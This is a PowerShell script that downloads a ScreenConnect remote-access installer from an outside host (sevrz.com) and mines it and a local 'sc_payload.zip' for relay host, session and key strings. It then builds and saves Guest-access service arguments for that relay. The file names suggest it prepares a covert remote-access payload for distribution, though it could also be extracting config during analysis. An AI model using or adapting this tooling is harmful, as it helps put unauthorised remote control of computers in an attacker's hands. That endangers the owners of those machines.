$ErrorActionPreference = 'Continue'
$msi = Join-Path $env:TEMP 'sc_setup_k.msi'
if (-not (Test-Path $msi)) {
  & curl.exe -L --ssl-no-revoke -o $msi 'https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
}
$bytes = [IO.File]::ReadAllBytes($msi)
$ascii = [Text.Encoding]::ASCII.GetString($bytes)
$uni = [Text.Encoding]::Unicode.GetString($bytes)
Write-Output "known s in ascii=$($ascii.Contains('68f9c17c-789b-4875-9823-29729818d7d6'))"
Write-Output "known s in uni=$($uni.Contains('68f9c17c-789b-4875-9823-29729818d7d6'))"

# Prefer strings that look like full service args
$patterns = @(
  '\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&s=[0-9a-fA-F\-]{36}&k=[A-Za-z0-9%+/=]+&v=[A-Za-z0-9%+/=]+',
  '\?e=Access&y=Guest&h=update\.sevrz\.com&p=443&k=[A-Za-z0-9%+/=]+',
  '\?h=update\.sevrz\.com&p=443&k=[A-Za-z0-9%+/=]+'
)
$found = @()
foreach ($encName in @('ASCII','Unicode')) {
  $t = if ($encName -eq 'ASCII') { $ascii } else { $uni }
  foreach ($pat in $patterns) {
    [regex]::Matches($t, $pat) | ForEach-Object {
      $v = ($_.Value -replace '[^\x20-\x7E].*$','')
      if ($v.Length -ge 80) {
        $found += [pscustomobject]@{ Enc=$encName; Len=$v.Length; HasS=($v -match '&s='); HasV=($v -match '&v='); Val=$v }
      }
    }
  }
}
$found = $found | Sort-Object HasS,HasV,Len -Descending | Select-Object -Unique -Property Enc,Len,HasS,HasV,Val
Write-Output "found=$($found.Count)"
$found | Select-Object -First 8 | ForEach-Object {
  Write-Output ("[{0}] len={1} s={2} v={3} head={4}" -f $_.Enc,$_.Len,$_.HasS,$_.HasV,$_.Val.Substring(0,[Math]::Min(100,$_.Len)))
}

# Build service args from system.config style + e/y
$m = [regex]::Match($ascii, '\?h=update\.sevrz\.com&amp;p=443&amp;k=([A-Za-z0-9%+/=]+)')
if ($m.Success) {
  Write-Output "raw amp match len=$($m.Length)"
}
# better decode from zip system.config value
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipPath = 'C:\Users\nobuddy\Desktop\Project\github-drop\sc_payload.zip'
$z = [IO.Compression.ZipFile]::OpenRead($zipPath)
$e = $z.Entries | Where-Object { $_.Name -eq 'system.config' } | Select-Object -First 1
$sr = New-Object IO.StreamReader($e.Open())
$cfg = $sr.ReadToEnd(); $sr.Close(); $z.Dispose()
$vm = [regex]::Match($cfg, '<value>(\?h=update\.sevrz\.com.*?)</value>')
$constraint = [System.Net.WebUtility]::HtmlDecode($vm.Groups[1].Value)
Write-Output "constraint=$constraint"

# Guest access style used historically
$serviceArgs = '?e=Access&y=Guest&' + ($constraint.TrimStart('?'))
Write-Output "serviceArgs len=$($serviceArgs.Length)"
Write-Output "serviceArgs=$serviceArgs"
Set-Content -Path 'C:\Users\nobuddy\Desktop\Project\github-drop\sc_args.txt' -Value $serviceArgs -Encoding ASCII -NoNewline
Write-Output 'wrote sc_args.txt'
